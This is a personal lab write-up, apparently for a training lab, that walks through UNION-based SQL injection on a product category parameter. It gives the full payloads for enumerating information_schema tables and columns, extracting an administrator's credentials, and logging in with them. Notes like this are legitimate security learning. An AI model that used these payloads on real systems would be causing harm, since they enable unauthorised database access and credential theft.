## 📌 **1. Observation**

- The vulnerable parameter was located in the **category** field of the product listing system.
- The original value was something like `category=Gifts`. Supplying valid category values loaded products normally.
- Injecting a **single quote (`'`)** resulted in an **Internal Server Error**, confirming the value is placed inside a SQL string literal.
- This indicated:
    - Input is concatenated directly into an SQL query.
    - No sanitization or escaping occurs.
- Early attempts to enumerate columns and tests suggested both columns in the result set accept **text data**.
- Difficulty:
    - At first, identifying the correct metadata tables (`information_schema.tables`, `information_schema.columns`) was confusing.
    - Especially understanding which fields to query (`table_name`, `column_name`) and how to filter by specific table names.
- Eventually confirmed the backend supports **information_schema**, proving it is a non-Oracle SQL database.
- Payloads worked only when sent through **Burp Suite** — browser URL encoding altered the payload structure, breaking results.

---

## 🧠 **2. Hypothesis**

Likely backend query structure:

```sql
SELECT * FROM products
WHERE category = '<user_input>';
```

Reasoning:

- Single quote breaks the query → confirms injection into a quoted string.
- UNION-based SQL injection should work if:
    - Correct column count is matched.
    - Datatypes align (text/text in this lab).
- Because **information_schema** exists, we can:
    - List all tables.
    - Identify interesting tables (e.g., user tables).
    - Enumerate column names inside those tables.
    - Extract actual data from sensitive tables (users, passwords, etc.).

**Goal:** Fully enumerate DB tables → enumerate columns → extract usernames & passwords.

---

## 🧪 **3. Test (Experiments Conducted)**

### **Test 1 — Injection Detection**

- **Payload:**
    
    ```
    '
    ```
    
- **Result:** Internal Server Error.
- **Interpretation:** SQL injection confirmed; string literal break inside SQL query.

---

### **Test 2 — Table Enumeration via information_schema**

Attempted:

```sql
Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
```

- **Difficulty:**
    - Initially struggled with remembering the correct metadata fields (`table_name`).
    - Needed to rely on documentation/cheatsheets to recall the schema structure.
- **Result:** Listed all available database tables.

From this list, identified a suspicious table:

```
users_oocswl

```

---

### **Test 3 — Column Enumeration of Target Table**

Payload used:

```sql
Gifts'union select column_name, null
from information_schema.columns
where table_name='users_oocswl'--
```

- **Difficulty:**
    - Remembering correct casing and exact filter syntax.
    - Choosing which columns belong to username/password fields.
- **Result:** Retrieved column names, including:

```
username_fhnnjr
password_apmllk
```

---

### **Test 4 — Extracting User Credentials**

Payload used:

```sql
Gifts'union select username_fhnnjr, password_apmllk
from users_oocswl--
```

- **Actual Data Returned:**

```
administrator
pzr7wkmpwym1yjj2g7pa
```

---

### **Test 5 — Verification**

Logged in using extracted credentials:

- Username: `administrator`
- Password: `pzr7wkmpwym1yjj2g7pa`

**Result:** Logged in successfully → application UI confirmed administrator access and the ability to update email.

---

## 📊 **4. Result**

### ✔ **Final Payloads Used**

**Table enumeration:**

```sql
Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**Column enumeration:**

```sql
Gifts'union select column_name, null
from information_schema.columns
where table_name='users_oocswl'--
```

**Credentials extraction:**

```sql
Gifts'union select username_fhnnjr, password_apmllk
from users_oocswl--
```

### ✔ **Extracted Credentials**

```
administrator
pzr7wkmpwym1yjj2g7pa

```

### ✔ **Proof of Lab Completion**

- Logged in as administrator.
- UI confirmed elevated access and ability to update account info.
- Screenshot proof:

  <img width="1183" height="592" alt="image" src="https://github.com/user-attachments/assets/57a58dcf-b0ef-4192-a5e4-06d130e1d044" />


---

## 🎓 **5. Learning (Deep Reasoning)**

- **information_schema** is universal in non-Oracle databases:
    - `information_schema.tables`
    - `information_schema.columns`
    - `table_name` and `column_name` fields are key to enumeration.
- Extracting database structure requires:
    - Understanding SQL metadata layout.
    - Filtering correctly by table name.
    - Matching column datatypes for successful UNION.
- Modern browser URL handling blocks many special characters:
    - Always use **Burp Suite** to avoid automatic sanitization/encoding.
- Finding a “juicy” table typically means:
    - Table name includes `users`, `customer`, `accounts`, etc.
    - Prioritize these for credential extraction.
- Enumeration sequence matters:
    1. Confirm SQLi
    2. Find column count
    3. Identify metadata source
    4. List tables
    5. List columns
    6. Extract data
- Understanding this flow builds the ability to perform real-world SQLi exploitation quickly and efficiently.

---

## 🔮 **6. Future Pattern Detection**

Recognize these signs as strong indicators of SQLi on non-Oracle DBs:

- `'` → server error.
- Application displays or reflects injected data patterns.
- Supports `information_schema.tables` → non-Oracle DBMS.
- UNION SELECT works after matching text columns.
- Credential-based tables often appear with obfuscated suffixes.
- Browser blocks payloads; proxy executes correctly.

These patterns help quickly determine database type and the most efficient enumeration method.

---

## 🧭 **7. Notes for My Future Self**

- Always begin with `'` → fastest SQLi detection.
- When stuck, check `information_schema` structure.
- Remember:
    - **table_name** is in `information_schema.tables`
    - **column_name** is in `information_schema.columns`
- If extraction fails, check datatype compatibility.
- Use Burp for every test — never trust browser behavior.
- Prioritize fast wins: enumerate metadata → extract credentials → verify access.
